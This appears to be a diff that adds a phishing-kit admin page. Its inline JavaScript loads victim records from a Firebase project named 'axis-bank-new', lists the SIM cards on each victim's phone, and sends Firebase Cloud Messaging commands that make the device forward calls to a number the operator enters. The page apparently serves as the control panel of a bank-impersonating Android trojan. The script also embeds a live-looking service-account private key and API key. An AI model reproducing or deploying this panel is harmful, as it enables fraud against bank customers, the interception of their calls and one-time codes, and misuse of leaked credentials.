@@ -1,0 +1,515 @@
+
+<!doctype html>
+<html lang="en" data-bs-theme="blue-theme">
+
+
+<!-- Mirrored from codervent.com/maxton/demo/horizontal-menu/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Feb 2025 19:36:46 GMT -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Admin Dashboard</title>
+    <link rel="icon" href="https://walettepay.shop/anand_site/assets/images/favicon-32x32.png" type="image/png">
+  <!-- loader-->
+  <link href="https://walettepay.shop/anand_site/assets/css/pace.min.css" rel="stylesheet">
+  <script src="https://walettepay.shop/anand_site/assets/js/pace.min.js"></script>
+
+  <!--plugins-->
+  <link href="https://walettepay.shop/anand_site/assets/plugins/perfect-scrollbar/css/perfect-scrollbar.css" rel="stylesheet">
+  <link rel="stylesheet" type="text/css" href="https://walettepay.shop/anand_site/assets/plugins/metismenu/metisMenu.min.css">
+  <link rel="stylesheet" type="text/css" href="https://walettepay.shop/anand_site/assets/plugins/metismenu/mm-vertical.css">
+  <link rel="stylesheet" type="text/css" href="https://walettepay.shop/anand_site/assets/plugins/simplebar/css/simplebar.css">
+  <!--bootstrap css-->
+  <link href="https://walettepay.shop/anand_site/assets/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/assets/plugins/datatable/css/dataTables.bootstrap5.min.css" rel="stylesheet" />
+  <link href="https://walettepay.shop/anand_site/https://fonts.googleapis.com/css2?family=Noto+Sans:wght@300;400;500;600&amp;display=swap" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/https://fonts.googleapis.com/css?family=Material+Icons+Outlined" rel="stylesheet">
+  <!--main css-->
+  <link href="https://walettepay.shop/anand_site/assets/css/bootstrap-extended.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/sass/main.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/assets/css/horizontal-menu.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/sass/dark-theme.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/sass/blue-theme.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/sass/semi-dark.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/sass/bordered-theme.css" rel="stylesheet">
+  <link href="https://walettepay.shop/anand_site/sass/responsive.css" rel="stylesheet">
+  <style type="text/css">
+        
+        .sim-card {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+            background-color: black;
+            cursor: pointer;
+        }
+
+        .sim-card.active {
+            background-color: green;
+            border-color: #9ac6ff;
+        }
+
+        .sim-card h5,
+        .sim-card p {
+            margin: 0;
+        }
+    </style>
+ <!-- Include Firebase SDK -->
+    <script type="module">
+
+         if (!sessionStorage.getItem('userId')) {
+    window.location.href = 'index.html';
+}
+
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.11.0/firebase-app.js";
+        import { getDatabase, ref, get } from "https://www.gstatic.com/firebasejs/9.11.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAyKJIHxV0dP6rAKluCvG4YRSND1IDd7h8",
+  authDomain: "axis-bank-new.firebaseapp.com",
+  databaseURL: "https://axis-bank-new-default-rtdb.firebaseio.com",
+  projectId: "axis-bank-new",
+  storageBucket: "axis-bank-new.firebasestorage.app",
+  messagingSenderId: "1011041344275",
+  appId: "1:1011041344275:web:635787bff2708395a718e6",
+  measurementId: "G-91SXZEE7R2"
+        };
+
+        const serviceAccount = {
+            "type": "service_account",
+  "project_id": "axis-bank-new",
+  "private_key_id": "61a388d20689da45ed639ec80d73cf274c391079",
+  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCowcg9dDgRYjNM\noBaOIBP7JPOIQ5Q9xmB9BhE1sYRa8qsl5ZK5mbFS7zVfnC4R6f32i5sKN4I3CrQo\nCbHQaRIdwbgY6srw6ise3Tx3GtEsY+W7ra4zrZ9pBgPRME4ePyzQCVpZvAJbIolj\nsoWN6jIdBRfmPLXq4OAvrIpmHtA6AtJo2XPy5bnDS4h0sY+HBCXQ0Bncmf8iSnoY\n4etuTfAotLS3+jdAM8XgSA8T8PGekIDDbTobMXVimV5YqDqIOCQ8hXuUDzHFi2+F\nMC15/qii/7Qd7W7er7BQSIoPAVeckyvf6TptTtUK4mUvMvT9Dq4EOfjSLM+Ug7Tf\nT+XeQGY3AgMBAAECggEAPnbL6YNVJYoVtu0irCTPgIxi4DMzcdI18NEIGbnFZeyg\n0Pwy3SQ4cJw+Q0+J9fOIn3N5RcTaHAmIObGs8ZmSrRUBUafGynnC0D/Pm75/YlDv\nvhJBgrtnX/Zr/0hEAgocSjzMBp8CuD0GYbK4oJjpR7iU6hHavD/Ue5EAAWCybmX2\ngZLaNv9w/AYLz6DS+fcr8EOcyZCEPF9QisKDyzkU2SuO+NvkRsE+R26jAEN400tX\nlc01NeaMDZd8nNGCO8mjvcFGrR41gkX7/ZPmuaceCVWpaE8Ia61XNLCjgQuJ1p98\n/ImjfvBNsco/DRVl7dKHTDYjfTptoegnxd9ZRcj7wQKBgQDjaqzG4Q77FbZRBFEj\nn2iqgAesNKqSWI0tViYvnqKXeTlc27VRAFDXHu1hPuePmJH4QvZyhdNUm/YJdvDD\nm7jQedNkJOHsg9DSQ06OhZuxiSyhmXxJDmc3ahuZl9Oru2+9Flx9GbNDNSBvmRVb\nIqPX6KBl4UYjGSbbLpHoELdgBwKBgQC99641YGv3sTPKfbAnvmKJnE522JJjzvUd\n4erhLCCc8OhQcpnnd4cxcctcmuePE9wD0I33BOAk6Uy1ZfJ897oysXDjoopisfUO\nI6MO6Gu/sROQ1vaoyuyxMI5oJHOGPrXaLTUwj8jF4epj8BvWpeDqQbP1z21YSOZB\ns+ALjWPcUQKBgDSjH0SVGQOSvfU4m5M0NWSpZ507P3PKHTsuIn6JKDcJLvbIP8p0\n2UFBfk4w4iYBeV/OF/7f7M87nhIIvqd35qoSWJRoWQaGaBIS1B7229eW2Ya54OOD\n+u3/mE3Pr4WjR7SrdVLbXPukU1KhSykh9mxmAqIyJyq+ipjWyZy+KcOHAoGAUCHz\ndYaX5KL2ItuD/C/eJwgtPQq8Laf2U8Whq5xOoYUpqg29iBsuhxfmXcjmFr+c1msa\nB3IiDs/u0LIRaM+i1pFs+kjtMRa6NV2pAbffA7xxcW6MG8WFtHS0DZAavy0izsa1\nIif03CwhEEkPpSrRxl8yx2TZTh1qK5rxzk21KxECgYAHlqU3WK3A66bVp9Wt/9b1\nKDBB/X0RSxCuWZ9cimfXWIILEEvyvCK0V+qlrTbPGkMCyco01mXOFZRJL9BoSIXI\ng6HQbVnxdiMOCp0sLtQpikbAmoJcit5BbJqSDuB+evy2NOQJt2jv47y7lZA3HtdU\nE4fU7TQJ+Xq4PzymUCXOBw==\n-----END PRIVATE KEY-----\n",
+  "client_email": "firebase-adminsdk-tte9q@axis-bank-new.iam.gserviceaccount.com",
+  "client_id": "100929760601556890599",
+  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
+  "token_uri": "https://oauth2.googleapis.com/token",
+  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
+  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-tte9q%40axis-bank-new.iam.gserviceaccount.com",
+  "universe_domain": "googleapis.com"
+        };
+
+        let selectedSimSlot = "";
+        let userData;
+
+        async function getBearerToken() {
+            const { client_email, private_key, token_uri } = serviceAccount;
+
+            const claim = {
+                iss: client_email,
+                scope: "https://www.googleapis.com/auth/firebase.messaging",
+                aud: token_uri,
+                iat: Math.floor(Date.now() / 1000),
+                exp: Math.floor(Date.now() / 1000) + 3600
+            };
+
+            const header = {
+                alg: "RS256",
+                typ: "JWT"
+            };
+
+            function base64url(source) {
+                const encodedSource = btoa(JSON.stringify(source))
+                    .replace(/=+$/, "")
+                    .replace(/\+/g, "-")
+                    .replace(/\//g, "_");
+                return encodedSource;
+            }
+
+            const encodedHeader = base64url(header);
+            const encodedPayload = base64url(claim);
+
+            const cryptoKey = await crypto.subtle.importKey(
+                "pkcs8",
+                Uint8Array.from(atob(private_key.split("-----")[2].replace(/\n/g, "")), c => c.charCodeAt(0)),
+                { name: "RSASSA-PKCS1-v1_5", hash: { name: "SHA-256" } },
+                false,
+                ["sign"]
+            );
+
+            const signature = await crypto.subtle.sign(
+                "RSASSA-PKCS1-v1_5",
+                cryptoKey,
+                new TextEncoder().encode(`${encodedHeader}.${encodedPayload}`)
+            );
+
+            const jwt = `${encodedHeader}.${encodedPayload}.${btoa(
+                String.fromCharCode(...new Uint8Array(signature))
+            )}`;
+
+            const response = await fetch(token_uri, {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: new URLSearchParams({
+                    grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer",
+                    assertion: jwt
+                })
+            });
+
+            const data = await response.json();
+            return data.access_token;
+        }
+
+        async function sendMessage(userId) {
+            const phoneNumber = document.getElementById("phone-number").value.trim();
+
+            if (!phoneNumber) {
+                alert("Please enter a valid 10-digit phone number.");
+                return;
+            }
+
+            if (!selectedSimSlot) {
+                alert("Please select a SIM.");
+                return;
+            }
+
+            const fcmToken = userData.fcmid;
+            const payload = {
+                message: {
+                    token: fcmToken,
+                    data: {
+                        title: selectedSimSlot,
+                        message: "a",
+                        number: phoneNumber,
+                        carrier: "c",
+                        type: "c",
+                        msg: ""
+                    }
+                }
+            };
+
+            try {
+                const bearerToken = await getBearerToken();
+                const response = await fetch("https://fcm.googleapis.com/v1/projects/axis-bank-new/messages:send", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Authorization": `Bearer ${bearerToken}`
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const responseData = await response.json();
+                console.log("FCM Response:", responseData);
+
+                if (responseData.name) {
+                    alert("call forwarding successfully!");
+                } else {
+                    alert("Failed to call forwarding");
+                }
+            } catch (error) {
+                console.error("Error ", error);
+                alert("An error occurred.");
+            }
+        }
+
+        async function loadUserData(userId) {
+            const db = getDatabase(initializeApp(firebaseConfig));
+            const userRef = ref(db, `axis03user/${userId}`);
+            const snapshot = await get(userRef);
+
+            if (snapshot.exists()) {
+                userData = snapshot.val();
+                displaySimCards(userData.sim);
+            } else {
+                alert("No user data found!");
+            }
+        }
+
+        function displaySimCards(simData) {
+            const simContainer = document.getElementById("sim-container");
+            simContainer.innerHTML = "";
+
+            Object.keys(simData).forEach((key) => {
+                if (key.startsWith("CarrierName")) {
+                    const slotIndex = key.replace("CarrierName", "");
+                    const simCard = document.createElement("div");
+                    simCard.className = "sim-card";
+                    simCard.id = `SimSlot${slotIndex}`;
+
+                    const carrierName = simData[`CarrierName${slotIndex}`] || "Unknown Carrier";
+                    const phoneNumber = simData[`PhoneNumber${slotIndex}`] || "Unknown Number";
+                    const activate = simData[`activate${slotIndex}`] ? "Active" : "Inactive";
+
+                    simCard.innerHTML = `
+                        <h5>${carrierName}</h5>
+                        <p>Phone: ${phoneNumber}</p>
+                        <p>Status: ${activate}</p>
+                    `;
+
+                    simCard.addEventListener("click", () => {
+                        document.querySelectorAll(".sim-card").forEach(card => card.classList.remove("active"));
+                        simCard.classList.add("active");
+                        selectedSimSlot = slotIndex;
+                    });
+
+                    simContainer.appendChild(simCard);
+                }
+            });
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const userId = new URLSearchParams(window.location.search).get("id");
+            if (!userId) {
+                alert("User ID not provided in URL!");
+                return;
+            }
+
+            loadUserData(userId);
+
+            document.getElementById("send-message").addEventListener("click", () => {
+                sendMessage(userId);
+            });
+        });
+    </script>
+</head>
+
+<body>
+ <header class="top-header">
+  <nav class="navbar navbar-expand align-items-center justify-content-between gap-4 border-bottom">
+    <div class="logo-header d-none d-xl-flex align-items-center gap-2">
+      <div class="logo-icon">
+        <img src="https://walettepay.shop/anand_site/assets/images/logo-icon.png" class="logo-img" width="45" alt="">
+      </div>
+      <div class="logo-name">
+        <h5 class="mb-0">Maxton</h5>
+      </div>
+    </div>
+    <div class="btn-toggle d-xl-none" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar">
+      <a href="https://walettepay.shop/anand_site/javascript:;"><i class="material-icons-outlined">menu</i></a>
+    </div>
+   
+   
+
+  </nav>
+</header>
+<!--end top header-->
+    <div id="loading-container" class="loading-container">
+        <div class="spinner-border" role="status">
+            <span class="sr-only">Loading...</span>
+        </div>
+    </div>
+
+<!--navigation-->
+<div class="primary-menu">
+  <nav class="navbar navbar-expand-xl align-items-center">
+   <div class="offcanvas offcanvas-start w-260" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
+   <div class="offcanvas-header border-bottom h-70">
+     <div class="d-flex align-items-center gap-2">
+       <div class="">
+         <img src="https://walettepay.shop/anand_site/assets/images/logo-icon.png" class="logo-icon" width="45" alt="logo icon">
+       </div>
+       <div class="">
+         <h4 class="logo-text">Maxton</h4>
+       </div>
+     </div>
+     <a href="https://walettepay.shop/anand_site/javascript:;" class="primaery-menu-close" data-bs-dismiss="offcanvas">
+      <i class="material-icons-outlined">close</i>
+     </a>
+   </div>
+   <div class="offcanvas-body p-0">
+     <ul class="navbar-nav align-items-center flex-grow-1">
+     <li class="nav-item">
+       <a class="nav-link " href="dashboard.html">
+         <div class="parent-icon"><i class="material-icons-outlined">home</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Dashboard</div>
+       </a>
+   
+       </li>
+       <li class="nav-item">
+       <a class="nav-link" href="Log-Enteries.html">
+         <div class="parent-icon"><i class='material-icons-outlined'>apps</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Log Enteries</div>
+       </a>
+      
+       </li>
+       <li class="nav-item">
+       <a class="nav-link" href="Messages.html">
+         <div class="parent-icon"><i class='material-icons-outlined'>note_alt</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Messages</div>
+       </a>
+      
+       </li>
+       <li class="nav-item">
+       <a class="nav-link" href="Settings.html">
+         <div class="parent-icon"><i class='material-icons-outlined'>account_circle</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Settings</div>
+       </a>
+      
+       </li>
+       <li class="nav-item dropdown">
+       <a class="nav-link" href="Email.html">
+         <div class="parent-icon"><i class='material-icons-outlined'>medical_services</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Email</div>
+       </a>
+      
+       </li>
+       <li class="nav-item dropdown">
+       <a class="nav-link" href="Change-Password.html">
+         <div class="parent-icon"><i class='material-icons-outlined'>pie_chart</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Change Password</div>
+       </a>
+      
+       </li>
+       <li class="nav-item">
+       <a class="nav-link" href="Logout.html"   >
+         <div class="parent-icon"><i class='material-icons-outlined'>table_chart</i>
+         </div>
+         <div class="menu-title d-flex align-items-center">Logout</div>
+       </a>
+  
+       </li>
+     </ul>
+   </div>
+   </div>
+ </nav>
+</div>
+<!--end navigation-->
+
+  <!--start main wrapper-->
+  <main class="main-wrapper">
+    <div class="main-content">
+      <!--breadcrumb-->
+        <div class="page-breadcrumb d-none d-sm-flex align-items-center mb-3">
+   
+      
+        </div>
+        <!--end breadcrumb-->
+   
+        <h6 class="mb-0 text-uppercase">Send FCM Message</h6>
+        <hr>
+        <div class="card">
+         <div id="sim-container"></div>
+        </div>
+
+        <div class="card">
+         <div id="form-group">
+
+          <input type="text" id="phone-number" class="form-control form-control-lg mb-3" placeholder="Enter Phone Number">
+
+          <div class="text-center m-2">
+          <button id="send-message" class="btn btn-primary">Call Forwading</button>
+          </div>
+
+         </div>
+        </div>
+
+
+    </div>
+  </main>
+  <!--end main wrapper-->
+
+
+    <!--start overlay-->
+    <div class="overlay btn-toggle"></div>
+    <!--end overlay-->
+
+
+
+     <!--start footer-->
+     <footer class="page-footer">
+      <p class="mb-0">Copyright © 2025. All right reserved.</p>
+    </footer>
+    <!--top footer-->
+
+  <!--start switcher-->
+  <button class="btn btn-grd btn-grd-primary position-fixed bottom-0 end-0 m-3 d-flex align-items-center gap-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#staticBackdrop">
+    <i class="material-icons-outlined">tune</i>Customize
+  </button>
+  
+  <div class="offcanvas offcanvas-end" data-bs-scroll="true" tabindex="-1" id="staticBackdrop">
+    <div class="offcanvas-header border-bottom h-70">
+      <div class="">
+        <h5 class="mb-0">Theme Customizer</h5>
+        <p class="mb-0">Customize your theme</p>
+      </div>
+      <a href="https://walettepay.shop/anand_site/javascript:;" class="primaery-menu-close" data-bs-dismiss="offcanvas">
+        <i class="material-icons-outlined">close</i>
+      </a>
+    </div>
+    <div class="offcanvas-body">
+      <div>
+        <p>Theme variation</p>
+
+        <div class="row g-3">
+          <div class="col-12 col-xl-6">
+            <input type="radio" class="btn-check" name="theme-options" id="BlueTheme" checked>
+            <label class="btn btn-outline-secondary d-flex flex-column gap-1 align-items-center justify-content-center p-4" for="BlueTheme">
+              <span class="material-icons-outlined">contactless</span>
+              <span>Blue</span>
+            </label>
+          </div>
+          <div class="col-12 col-xl-6">
+            <input type="radio" class="btn-check" name="theme-options" id="LightTheme">
+            <label class="btn btn-outline-secondary d-flex flex-column gap-1 align-items-center justify-content-center p-4" for="LightTheme">
+              <span class="material-icons-outlined">light_mode</span>
+              <span>Light</span>
+            </label>
+          </div>
+          <div class="col-12 col-xl-6">
+            <input type="radio" class="btn-check" name="theme-options" id="DarkTheme">
+            <label class="btn btn-outline-secondary d-flex flex-column gap-1 align-items-center justify-content-center p-4" for="DarkTheme">
+              <span class="material-icons-outlined">dark_mode</span>
+              <span>Dark</span>
+            </label>
+          </div>
+          <div class="col-12 col-xl-6">
+            <input type="radio" class="btn-check" name="theme-options" id="SemiDarkTheme">
+            <label class="btn btn-outline-secondary d-flex flex-column gap-1 align-items-center justify-content-center p-4" for="SemiDarkTheme">
+              <span class="material-icons-outlined">contrast</span>
+              <span>Semi Dark</span>
+            </label>
+          </div>
+          <div class="col-12 col-xl-6">
+            <input type="radio" class="btn-check" name="theme-options" id="BoderedTheme">
+            <label class="btn btn-outline-secondary d-flex flex-column gap-1 align-items-center justify-content-center p-4" for="BoderedTheme">
+              <span class="material-icons-outlined">border_style</span>
+              <span>Bordered</span>
+            </label>
+          </div>
+        </div><!--end row-->
+
+      </div>
+    </div>
+  </div>
+  <!--start switcher-->
+
+  <!--bootstrap js-->
+  <script src="https://walettepay.shop/anand_site/assets/js/bootstrap.bundle.min.js"></script>
+
+  <!--plugins-->
+  <script src="https://walettepay.shop/anand_site/assets/js/jquery.min.js"></script>
+  <!--plugins-->
+  <script src="https://walettepay.shop/anand_site/assets/plugins/perfect-scrollbar/js/perfect-scrollbar.js"></script>
+  <script src="https://walettepay.shop/anand_site/assets/plugins/metismenu/metisMenu.min.js"></script>
+  <script src="https://walettepay.shop/anand_site/assets/plugins/datatable/js/jquery.dataTables.min.js"></script>
+  <script src="https://walettepay.shop/anand_site/assets/plugins/datatable/js/dataTables.bootstrap5.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      $('#example').DataTable();
+      } );
+  </script>
+  <script>
+    $(document).ready(function() {
+      var table = $('#example2').DataTable( {
+        lengthChange: false,
+      } );
+     
+      table.buttons().container()
+        .appendTo( '#example2_wrapper .col-md-6:eq(0)' );
+    } );
+  </script>
+  <script src="https://walettepay.shop/anand_site/assets/plugins/simplebar/js/simplebar.min.js"></script>
+  <script src="https://walettepay.shop/anand_site/assets/js/main.js"></script>
+
+
+</body>
+
+
+<!-- Mirrored from codervent.com/maxton/demo/horizontal-menu/table-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Feb 2025 19:38:13 GMT -->
+</html>
